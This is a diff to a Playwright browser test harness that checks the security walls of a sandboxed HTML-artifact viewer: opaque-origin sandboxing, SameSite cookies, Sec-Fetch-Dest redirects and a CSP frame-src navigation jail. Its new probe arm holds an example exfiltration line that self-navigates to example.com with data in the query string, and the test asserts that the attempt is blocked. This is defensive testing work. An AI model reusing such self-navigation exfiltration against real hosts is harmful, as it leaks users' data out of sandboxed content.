@@ -5,9 +5,17 @@
  *
  * This is NOT a confirmatory regression test -- it is the ONLY thing that
  * proves premises P1 (the `sandbox` response-header directive produces an
- * opaque origin, even with `allow-scripts`, in a real browser) and P2 (the
+ * opaque origin, even with `allow-scripts`, in a real browser), P2 (the
  * `SameSite=Lax` auth cookie withholds itself from a same-origin fetch made
- * by that opaque-origin document) actually hold. Structural template:
+ * by that opaque-origin document), P6 (`Sec-Fetch-Dest` gating -- fail
+ * closed to the viewer shell for anything that isn't a genuine
+ * iframe-embedded load), and P7 (the viewer shell's `frame-src 'self'`
+ * blocks a child artifact's navigations, INCLUDING self-navigation --
+ * closing the exfiltration-via-`location=` hole) actually hold. Arms 0-5
+ * probe the artifact's own execution context; arms 6-7 (added alongside
+ * the navigation-jail shell) probe the shell's `frame-src` wall and the
+ * `Sec-Fetch-Dest` gate respectively -- see their own inline comments.
+ * Structural template:
  * `scripts/run-preview-sandbox-browser-check.mjs` (Issue #1162 precedent) --
  * same `playwright-core` / `chromium.launch()` driver, same Chromium
  * executable resolution helper (copied verbatim, including the aarch64 snap
@@ -341,7 +349,12 @@ function buildProbeArtifactHtml() {
 
   // Capture securitypolicyviolation events for the fetch/form arms below --
   // corroborating evidence for whichever wall (CSP resource restriction vs.
-  // SameSite cookie omission) actually fires.
+  // SameSite cookie omission) actually fires. NOTE: this listener is on
+  // THIS document (the artifact itself); it does NOT see arm 6's
+  // frame-src violation below, which CSP dispatches on the EMBEDDING
+  // document (the shell) since frame-src governs the embedder's policy
+  // over a child's navigation, not the child's own policy. The harness
+  // script separately listens for that on the shell page.
   var cspViolations = [];
   document.addEventListener('securitypolicyviolation', function (e) {
     cspViolations.push({ violatedDirective: e.violatedDirective, blockedURI: e.blockedURI, disposition: e.disposition });
@@ -387,14 +400,52 @@ function buildProbeArtifactHtml() {
       form.method = 'POST';
       document.body.appendChild(form);
       form.submit();
+      return new Promise(function (resolve) {
+        setTimeout(function () {
+          var formViolation = cspViolations.find(function (v) { return v.violatedDirective.indexOf('form-action') !== -1; });
+          post('external-form-result', {
+            navigatedAway: window.location.href.indexOf('example.com') !== -1,
+            formActionViolationObserved: !!formViolation,
+            cspViolations: cspViolations.slice(),
+          });
+          resolve();
+        }, 500);
+      });
+    })
+    .then(function () {
+      // Arm 6: self-navigation exfiltration attempt (P7 -- a script-driven
+      // self-navigation to an external origin, the vulnerability this
+      // shell's frame-src exists to close). Uses https://example.com/ for
+      // consistency with arms 4/5's existing external target (both already
+      // use example.com in this same script), rather than an unverified
+      // .invalid-TLD assumption.
+      //
+      // MUST run LAST, after every other arm has already posted its
+      // result: empirically (verified against real Chromium), a
+      // frame-src-blocked navigation attempt does not merely fail
+      // silently like a blocked fetch() does -- it replaces this
+      // document's entire content with a Chromium error interstitial
+      // (chrome-error://chromewebdata/), tearing down this JS realm.
+      // Running this arm any earlier would have prevented arms 3-5 from
+      // ever completing (discovered when arm 5 stopped reporting once
+      // arm 6 was first added ahead of it).
+      try {
+        window.location = 'https://example.com/?exfil=' + encodeURIComponent(document.title || 'probe');
+      } catch (err) {
+        post('self-navigation-result', { attempted: true, threw: true, message: String(err) });
+      }
       setTimeout(function () {
-        var formViolation = cspViolations.find(function (v) { return v.violatedDirective.indexOf('form-action') !== -1; });
-        post('external-form-result', {
-          navigatedAway: window.location.href.indexOf('example.com') !== -1,
-          formActionViolationObserved: !!formViolation,
-          cspViolations: cspViolations.slice(),
-        });
-      }, 500);
+        // If this fires at all, this document's JS context survived the
+        // navigation attempt -- i.e. it was blocked outright rather than
+        // replaced with an interstitial. Given the interstitial-replacement
+        // behavior documented above, this message's ABSENCE is EXPECTED
+        // and is NOT itself evidence of a successful exfiltration -- it is
+        // corroborating evidence only when present. The harness script's
+        // Playwright-level child-frame URL check (never reaches the actual
+        // external target) and the shell page's securitypolicyviolation
+        // capture are the definitive signals.
+        post('self-navigation-result', { attempted: true, threw: false, hrefAfterAttempt: window.location.href });
+      }, 300);
     });
 })();
 </script>
@@ -534,6 +585,23 @@ async function main() {
   });
   console.log(`==> artifact created via real MCP call: ${JSON.stringify(toolResult)}`);
   const artifactUrl = `${baseUrl}/api${toolResult.path}`;
+  // The navigation-jail shell (docs/design/html-artifacts.md §3.3 P6/P7,
+  // routes/artifacts-viewer.ts) -- this is now the mandatory top-level
+  // entry point; the raw endpoint above only serves bytes to a genuine
+  // iframe-embedded load (Sec-Fetch-Dest: iframe).
+  const artifactShellUrl = `${baseUrl}${toolResult.path}`;
+
+  // Positive control for P7 (arm 6's "wall exists" proof): the shell's own
+  // CSP header, checked directly against the real production endpoint over
+  // real HTTP, imported (not replicated) from the production module.
+  const artifactViewerModule = await import('../../packages/server/src/routes/artifacts-viewer.ts');
+  const shellHeaderRes = await fetch(artifactShellUrl, { headers: { Cookie: cookieHeader } });
+  expect(
+    shellHeaderRes.headers.get('Content-Security-Policy') === artifactViewerModule.ARTIFACT_SHELL_CSP,
+    "positive control: the viewer shell's Content-Security-Policy header is the exact ARTIFACT_SHELL_CSP constant (frame-src 'self' wall exists)",
+    `observed=${JSON.stringify(shellHeaderRes.headers.get('Content-Security-Policy'))}`,
+  );
+  await shellHeaderRes.text();
 
   // -----------------------------------------------------------------
   // Browser probing.
@@ -633,10 +701,15 @@ async function main() {
     await harnessPage.close();
 
     // ---------------------------------------------------------------
-    // Real probe: harness parent page + iframe pointed at the REAL
-    // artifact-serving endpoint over real HTTP.
+    // Real probe: navigate DIRECTLY to the production viewer shell
+    // (`/artifacts/:id`), not the raw endpoint. With the navigation jail
+    // now mandatory, the representative real-world scenario is the shell
+    // being the top-level document with the artifact nested inside it
+    // (the server-rendered `<iframe sandbox="allow-scripts"
+    // src="/api/artifacts/:id">`) -- so this probe now exercises the REAL
+    // production shell HTML, not a synthetic harness-constructed iframe.
     // ---------------------------------------------------------------
-    console.log(`\n==> loading probe artifact via real HTTP: ${artifactUrl}`);
+    console.log(`\n==> navigating directly to the production viewer shell: ${artifactShellUrl}`);
     const probePage = await context.newPage();
     // Arm 5 detection, second signal (see the arm-5 assertion below for
     // why): a blocked `<form>` submission inside a sandboxed iframe that
@@ -652,34 +725,63 @@ async function main() {
     probePage.on('console', (msg) => {
       if (msg.type() === 'error') sandboxConsoleMessages.push(msg.text());
     });
-    // The harness wrapper page MUST be navigated to the disposable
-    // server's OWN origin (not left at page.setContent()'s about:blank),
-    // mirroring the production viewer page (`/artifacts/:id`), which
-    // wraps the same-origin `<iframe src="/api/artifacts/:id">`. This is
-    // not cosmetic: a SameSite=Lax cookie is withheld from a cross-site
-    // SUBFRAME navigation (an iframe's own request is not a top-level
-    // navigation, so Lax's top-level-navigation carve-out does not apply
-    // to it) -- an about:blank parent makes the artifact iframe's own GET
-    // cross-site and 401s before the probe script ever runs, which would
-    // be a harness-design bug, not the P2 boundary this arm exists to
-    // observe. `/health` is unauthenticated and same-origin, so it is a
-    // safe, real, same-site anchor page to navigate to first.
-    await probePage.goto(`${baseUrl}/health`);
-    await probePage.evaluate(() => {
+    // Attach the postMessage listener AND the shell-page securitypolicyviolation
+    // collector (arm 6's authoritative P7 signal -- CSP dispatches
+    // frame-src violations on the EMBEDDING document, i.e. this shell page,
+    // not on the artifact iframe that attempted the blocked navigation) via
+    // addInitScript, so both are registered BEFORE the shell's own
+    // server-rendered <iframe> has a chance to load and the artifact script
+    // inside it has a chance to run -- avoids a race where early messages
+    // (or an early violation) would otherwise be lost between navigation
+    // and a post-hoc evaluate() call.
+    await probePage.addInitScript(() => {
       window.__probeMessages = [];
       window.addEventListener('message', (e) => window.__probeMessages.push(e.data));
+      window.__cspViolations = [];
+      document.addEventListener('securitypolicyviolation', (e) => {
+        window.__cspViolations.push({
+          violatedDirective: e.violatedDirective,
+          blockedURI: e.blockedURI,
+          disposition: e.disposition,
+        });
+      });
     });
-    await probePage.evaluate((url) => {
-      const iframe = document.createElement('iframe');
-      iframe.src = url;
-      document.body.appendChild(iframe);
-    }, artifactUrl);
+    await probePage.goto(artifactShellUrl);
 
-    // Wait for all arms to report (form arm has its own 500ms internal
-    // delay before posting; give generous headroom).
-    await probePage.waitForTimeout(2000);
+    // Capture arm 7a's evidence EARLY -- a short settle wait after the
+    // initial navigation, well BEFORE arm 6 (the LAST arm in the
+    // artifact's own script, see buildProbeArtifactHtml) gets a chance to
+    // run. This ordering matters: arm 6's blocked self-navigation replaces
+    // the child frame's content with a Chromium error interstitial
+    // (`chrome-error://chromewebdata/`, confirmed empirically), so
+    // capturing the child frame's URL AFTER arm 6 has fired would no
+    // longer reflect "the real iframe-embedded load served bytes
+    // directly" -- it would reflect the LATER, unrelated interstitial.
+    await probePage.waitForTimeout(300);
+    const earlyChildFrames = probePage.frames().filter((f) => f !== probePage.mainFrame());
+    expect(
+      earlyChildFrames.length === 1,
+      'arm 7a precondition: exactly one child iframe is present inside the shell shortly after navigation',
+      `count=${earlyChildFrames.length}, urls=${JSON.stringify(earlyChildFrames.map((f) => f.url()))}`,
+    );
+    if (earlyChildFrames.length === 1) {
+      expect(
+        earlyChildFrames[0].url() === artifactUrl,
+        'arm 7a: the real browser iframe-embedded load of the raw endpoint served bytes directly (no redirect to the shell)',
+        `childFrame.url()=${earlyChildFrames[0].url()}, expected=${artifactUrl}`,
+      );
+    }
+
+    // Wait for the REMAINING arms to report. Arms 3-5 chain sequentially
+    // (fetch round trips + arm 5's 500ms internal delay), and arm 6 (the
+    // self-navigation attempt) runs LAST, only after arm 5 has already
+    // posted -- see buildProbeArtifactHtml's comment on why. Generous
+    // headroom for the full chain plus the interstitial replacement to
+    // settle.
+    await probePage.waitForTimeout(2500);
     const messages = await probePage.evaluate(() => window.__probeMessages);
     const byType = Object.fromEntries(messages.map((m) => [m.type, m.detail]));
+    const shellCspViolations = await probePage.evaluate(() => window.__cspViolations);
 
     console.log(`\n==> arm results (${messages.length} message(s) received)`);
 
@@ -801,7 +903,89 @@ async function main() {
         `detail=${JSON.stringify(extFormResult)}, sandboxConsoleMessages=${JSON.stringify(sandboxConsoleMessages)}`,
       );
     }
+
+    // Arm 6: self-navigation exfiltration attempt (P7 -- the shell's
+    // frame-src). Two independent, authoritative signals; the artifact's
+    // own postMessage (self-navigation-result) is corroborating only (see
+    // its own comment in buildProbeArtifactHtml for why its absence is
+    // EXPECTED, not a failure indicator).
+    console.log(`  DETAIL self-navigation-result: ${JSON.stringify(byType['self-navigation-result'])}`);
+    console.log(`  DETAIL shell page securitypolicyviolation events: ${JSON.stringify(shellCspViolations)}`);
+
+    // Signal (a): Playwright-level child-frame URL introspection -- the
+    // artifact's iframe must NEVER have reached the exfiltration target.
+    // NOTE (empirically discovered against real Chromium): a
+    // frame-src-blocked navigation does not leave the child frame parked
+    // at its ORIGINAL url -- Chromium replaces the frame's content with an
+    // error interstitial (`chrome-error://chromewebdata/`) once the
+    // blocked navigation is attempted. The correct assertion is therefore
+    // "never navigated to the attacker's origin", not "still at the
+    // original url" -- arm 7a (below) is what proves the original,
+    // pre-attempt load was the real raw endpoint.
+    const postArm6ChildFrames = probePage.frames().filter((f) => f !== probePage.mainFrame());
+    expect(
+      postArm6ChildFrames.length === 1,
+      'arm 6 precondition: exactly one child iframe is present inside the shell after the self-navigation attempt',
+      `count=${postArm6ChildFrames.length}, urls=${JSON.stringify(postArm6ChildFrames.map((f) => f.url()))}`,
+    );
+    if (postArm6ChildFrames.length === 1) {
+      expect(
+        !postArm6ChildFrames[0].url().startsWith('https://example.com'),
+        'arm 6: the artifact iframe never reached the exfiltration target (self-navigation to an external origin did not succeed)',
+        `childFrame.url()=${postArm6ChildFrames[0].url()}`,
+      );
+    }
+
+    // Signal (b): a frame-src securitypolicyviolation observed on the
+    // SHELL page (the embedding document CSP governs a child's navigation
+    // attempts, including self-navigation) -- the wall that actually fired.
+    const frameSrcViolation = shellCspViolations.find((v) => /frame-src/i.test(v.violatedDirective));
+    expect(
+      !!frameSrcViolation,
+      "arm 6: the shell page observed a frame-src securitypolicyviolation for the artifact's self-navigation attempt",
+      `shellCspViolations=${JSON.stringify(shellCspViolations)}`,
+    );
+
+    // Arm 7a assertion itself lives earlier in this script (captured via
+    // `earlyChildFrames`, BEFORE arm 6 had a chance to replace the child
+    // frame's content) -- see the comment there for why the timing matters.
+
     await probePage.close();
+
+    // Arm 7b: a direct top-level browser navigation to the RAW artifact
+    // URL (a separate page/tab from the main probe) must redirect to the
+    // viewer shell rather than rendering the artifact directly at the top
+    // level. Playwright's page.goto() follows redirects the same way a
+    // real browser does, so the final page.url() is the definitive signal.
+    const directPage = await context.newPage();
+    await directPage.goto(artifactUrl);
+    expect(
+      directPage.url() === artifactShellUrl,
+      'arm 7b: a real top-level browser navigation to the RAW artifact URL redirects to the viewer shell (P6)',
+      `directPage.url()=${directPage.url()}, expected=${artifactShellUrl}`,
+    );
+    await directPage.close();
+
+    // Arm 7b complementary check: a plain fetch() from THIS script's own
+    // Node/Bun process (no browser, no Fetch Metadata headers at all)
+    // against the raw endpoint -- the ABSENT case specifically, distinct
+    // from the real browser's Sec-Fetch-Dest: document covered just above.
+    // This is the case P6's design doc calls out as mattering most (the
+    // fail-closed default for old browsers / non-browser HTTP clients).
+    const nodeSideRawFetch = await fetch(artifactUrl, { headers: { Cookie: cookieHeader }, redirect: 'manual' });
+    expect(
+      nodeSideRawFetch.status === 302 || nodeSideRawFetch.type === 'opaqueredirect',
+      'arm 7b (absent case): a plain Node-side fetch() with no Sec-Fetch-Dest header redirects instead of receiving raw bytes',
+      `status=${nodeSideRawFetch.status}, type=${nodeSideRawFetch.type}`,
+    );
+    if (nodeSideRawFetch.status === 302) {
+      expect(
+        nodeSideRawFetch.headers.get('Location') === toolResult.path,
+        'arm 7b (absent case): the redirect Location is the viewer shell path',
+        `Location=${nodeSideRawFetch.headers.get('Location')}, expected=${toolResult.path}`,
+      );
+    }
+    await nodeSideRawFetch.text().catch(() => {});
 
     // ---------------------------------------------------------------
     // Positive controls -- SAME run, SAME browser context (same cookie
